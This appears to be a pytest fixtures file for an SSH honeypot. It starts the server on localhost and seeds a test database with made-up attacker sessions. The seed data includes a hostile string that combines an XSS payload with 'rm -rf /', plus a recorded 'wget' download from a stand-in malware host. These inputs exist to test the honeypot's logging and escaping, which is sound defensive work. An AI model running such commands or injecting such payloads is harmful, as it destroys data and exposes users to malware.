"""Shared fixtures.

The honeypot under test always listens on 127.0.0.1 with an ephemeral port,
and the test client only ever connects to 127.0.0.1.
"""

from __future__ import annotations

import asyncio
import time
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import asyncssh
import pytest

from sshhoneypot.config import Config
from sshhoneypot.hostkeys import load_or_create_host_keys
from sshhoneypot.logs import AuthLog, JsonLog
from sshhoneypot.notifiers import LoginEvent, Notifier, NotifierHub
from sshhoneypot.recorder import Recorder
from sshhoneypot.server import Honeypot
from sshhoneypot.storage import SQLiteStorage


def _merge(base: dict, over: dict) -> dict:
    out = dict(base)
    for k, v in over.items():
        out[k] = _merge(out[k], v) if isinstance(v, dict) and isinstance(out.get(k), dict) else v
    return out


@pytest.fixture(scope="session")
def key_dir(tmp_path_factory) -> Path:
    """One ed25519 host key for the whole run (generation is the slow part)."""
    d = tmp_path_factory.mktemp("hostkeys")
    load_or_create_host_keys(str(d), ["ssh-ed25519"])
    return d


@pytest.fixture
def make_config(tmp_path, key_dir) -> Callable[..., Config]:
    def make(**over: Any) -> Config:
        base = {
            "database": str(tmp_path / "honeypot.db"),
            "state_dir": str(key_dir),
            "auth_log": str(tmp_path / "auth.log"),
            "json_log": str(tmp_path / "events.jsonl"),
            "host_key_types": ["ssh-ed25519"],
            "listen": {"host": "127.0.0.1", "port": 0},
            "auth": {"failure_delay": 0},
        }
        return Config.model_validate(_merge(base, over))

    return make


class CollectingNotifier(Notifier):
    name = "collect"

    def __init__(self) -> None:
        self.events: list[LoginEvent] = []

    async def login(self, event: LoginEvent) -> None:
        self.events.append(event)


@dataclass
class Running:
    cfg: Config
    hp: Honeypot
    storage: SQLiteStorage
    recorder: Recorder
    notifier: CollectingNotifier
    auth_log: AuthLog
    json_log: JsonLog

    @property
    def port(self) -> int:
        return self.hp.port

    def rows(self, sql: str, *params: Any) -> list[dict]:
        cur = self.storage.conn.execute(sql, params)
        return [dict(r) for r in cur.fetchall()]

    def connect(self, username: str = "root", password: str = "wrong", **kw: Any):
        return client(self.port, username=username, password=password, **kw)


def client(port: int, **kw: Any):
    """asyncssh client options that ignore the developer's own SSH setup."""
    opts: dict[str, Any] = {
        "known_hosts": None,
        "client_keys": None,
        "agent_path": None,
        "config": None,
        "preferred_auth": "password",
        "connect_timeout": 10,
    }
    opts.update(kw)
    return asyncssh.connect("127.0.0.1", port, **opts)


@pytest.fixture
async def start_honeypot(make_config):
    running: list[Running] = []

    async def start(**over: Any) -> Running:
        cfg = make_config(**over)
        assert cfg.listen.host == "127.0.0.1"
        storage = SQLiteStorage(cfg.database)
        auth_log = AuthLog(cfg.auth_log, hostname=cfg.log_hostname)
        json_log = JsonLog(cfg.json_log)
        notifier = CollectingNotifier()
        recorder = Recorder(
            storage, auth_log=auth_log, json_log=json_log, notifier=NotifierHub([notifier])
        )
        keys = load_or_create_host_keys(cfg.state_dir, ["ssh-ed25519"])
        hp = Honeypot(cfg, recorder, keys)
        await hp.start()
        r = Running(cfg, hp, storage, recorder, notifier, auth_log, json_log)
        running.append(r)
        return r

    yield start
    for r in running:
        await r.hp.stop()
        r.auth_log.close()
        r.json_log.close()
        r.storage.close()


HOSTILE = '<img src=x onerror="alert(1)">|`rm -rf /`'


def populate(db: SQLiteStorage, now: float | None = None) -> None:
    """A small, fully known data set (documentation IP ranges only)."""
    now = time.time() if now is None else now

    def attempt(sid: str, ip: str, user: str, pw: str, ok: bool = False, dt: float = 0) -> None:
        db.add_auth_attempt(
            sid, ts=now - 3600 + dt, src_ip=ip, username=user, method="password", password=pw,
            success=ok,
        )  # fmt: skip

    sessions = [
        ("aaaaaaaaaaa1", "198.51.100.7", "CN", "SSH-2.0-libssh_0.9.6"),
        ("aaaaaaaaaaa2", "198.51.100.7", "CN", "SSH-2.0-libssh_0.9.6"),
        ("aaaaaaaaaaa3", "203.0.113.5", "US", "SSH-2.0-Go"),
        ("aaaaaaaaaaa4", "192.0.2.44", None, "SSH-2.0-OpenSSH_8.9p1"),
    ]
    for sid, ip, cc, ver in sessions:
        db.create_session(
            sid, started=now - 3600, src_ip=ip, src_port=40000, dst_port=2222, country=cc
        )
        db.update_session(sid, client_version=ver, hassh="f" * 32 if "libssh" in ver else "e" * 32)
    attempt("aaaaaaaaaaa1", "198.51.100.7", "root", "123456")
    attempt("aaaaaaaaaaa1", "198.51.100.7", "root", "admin", dt=1)
    attempt("aaaaaaaaaaa2", "198.51.100.7", "admin", "admin", dt=2)
    attempt("aaaaaaaaaaa3", "203.0.113.5", "root", "123456", dt=3)
    attempt("aaaaaaaaaaa3", "203.0.113.5", "ubuntu", "my-real-Passw0rd", dt=4)  # one source only
    attempt("aaaaaaaaaaa4", "192.0.2.44", HOSTILE, "123456", ok=True, dt=5)
    db.update_session(
        "aaaaaaaaaaa4", logged_in=1, login_user=HOSTILE, login_password="123456", login_at=now
    )
    for i, cmd in enumerate(["uname -a", HOSTILE, "wget http://malware.example/x.sh"]):
        db.add_command("aaaaaaaaaaa4", ts=now - 3000 + i, elapsed=i, kind="shell", command=cmd,
                       known=i != 1)  # fmt: skip
    db.add_command("aaaaaaaaaaa3", ts=now - 3000, elapsed=0, kind="exec", command="uname -a",
                   known=True)  # fmt: skip
    db.add_download("aaaaaaaaaaa4", ts=now - 2990, tool="wget", url="http://malware.example/x.sh")
    db.add_request("aaaaaaaaaaa4", ts=now - 2980, kind="direct-tcpip", detail="10.0.0.1:22")
    db.update_session("aaaaaaaaaaa4", ended=now - 2900, end_reason="client closed")


async def eventually(predicate: Callable[[], Any], timeout: float = 5.0) -> Any:
    """Poll until predicate() is truthy (database writes happen on connection events)."""
    deadline = time.monotonic() + timeout
    while True:
        value = predicate()
        if value:
            return value
        if time.monotonic() > deadline:
            raise AssertionError("condition not met in time")
        await asyncio.sleep(0.02)
